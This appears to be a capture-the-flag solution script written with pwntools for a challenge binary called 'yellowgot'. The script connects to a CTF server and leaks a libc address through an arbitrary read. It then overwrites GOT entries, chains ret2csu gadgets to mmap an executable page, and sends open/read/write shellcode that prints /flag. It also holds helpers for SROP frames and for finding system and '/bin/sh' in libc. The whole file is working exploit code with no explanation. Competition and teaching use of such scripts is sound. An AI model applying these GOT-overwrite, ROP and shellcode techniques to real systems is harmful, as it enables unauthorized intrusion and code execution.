from pwn import *
from LibcSearcher import *
from ae64 import AE64
from pwnlib.rop.rop import srop

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./yellowgot/yellowgot"
libc_addr = "./yellowgot/libc.so.6"
ld_addr = "../../glibc-all-in-one/libs/2.31-0ubuntu9_i386/ld-2.31.so"

rop = ROP(binary)
elf = ELF(binary)

libc = ELF(libc_addr)
ld = ELF(ld_addr)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 26995
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
    libc_addr = "/lib/x86_64-linux-gnu/libc.so.6"
    libc = ELF(libc_addr)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)
    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("offset: " + hex(offset))
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x401680


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(edi)  # r12
    payload += p64(rsi)  # r13
    payload += p64(rdx)  # r14
    payload += p64(r12)  # r15
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
def change(addr, value):
    p.sendlineafter(b"exit.\n", str(1).encode())
    p.sendafter(b"Address:\n", addr)
    p.sendafter(b"Value: \n", value)


def leak(addr):
    p.sendlineafter(b"exit.\n", str(2).encode())
    p.sendafter(b"Address:\n", addr)


atoi_got = elf.got.atoi
read_got = elf.got.read
puts_got = elf.got.puts
__stack_chk_fail_got = elf.got.__stack_chk_fail
puts_plt = elf.plt.puts
bss_addr = 0x404500
mmap = 0x233000

leak(str(atoi_got).encode())

p.recvline()

libc_offset = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0")) - libc.sym.atoi
ls(libc_offset)

libc.address = libc_offset

gets_addr = libc.sym.gets
puts_addr = libc.sym.puts
mprotect_addr = libc.sym.mprotect
mmap_addr = libc.sym.mmap
open_addr = libc.sym.open
pop_rcx = libc_offset + 0x000000000008C6BB
# pop_rcx = libc_offset + 0x000000000003C7B7

change(str(__stack_chk_fail_got).encode(), p32(puts_plt & 0xFFFFFFFF))
change(str(atoi_got).encode(), p32(gets_addr & 0xFFFFFFFF))

p.sendlineafter(b"exit.\n", str(2).encode())

payload = b"a" * 40
payload += csu(edi=0x0, rsi=bss_addr, rdx=0x10, r12=read_got)
payload += p64(pop_rcx) + p64(34)
payload += csu(edi=mmap, rsi=0x1000, rdx=0x7, r12=bss_addr + 0x8)
payload += csu(edi=0, rsi=mmap, rdx=0x200, r12=read_got)
payload += p64(0x233000)

"""
payload += csu(edi=bss_addr, rsi=0x0, rdx=0x0, r12=bss_addr + 0x8)
payload += csu(edi=3, rsi=bss_addr + 0x50, rdx=0x20, r12=read_got)
payload += csu(edi=bss_addr + 0x50, rsi=0x0, rdx=0x0, r12=puts_got)
"""

p.sendline(payload)
dbg(p)
p.sendafter(b"\n", b"/flag\x00\x00\x00" + p64(mmap_addr))

shell_close = """
mov rax,3;
xor rdi,rdi;
syscall;
"""

shell_open = """
mov rax,2;
mov rdi,0x404500;
xor rsi,rsi;
xor rdx,rdx;
syscall;
"""

shell_read = """
xor rax,rax;
xor rdi,rdi;
mov rsi,0x233100;
mov rdx, 0x100;
syscall;
"""

shell_write = """
mov rax,1;
mov rdi,2;
mov rsi,0x233100;
mov rdx, 0x100;
syscall;
"""

shellcode = asm(shell_close) + asm(shell_open) + asm(shell_read) + asm(shell_write)
p.send(shellcode)

p.interactive()
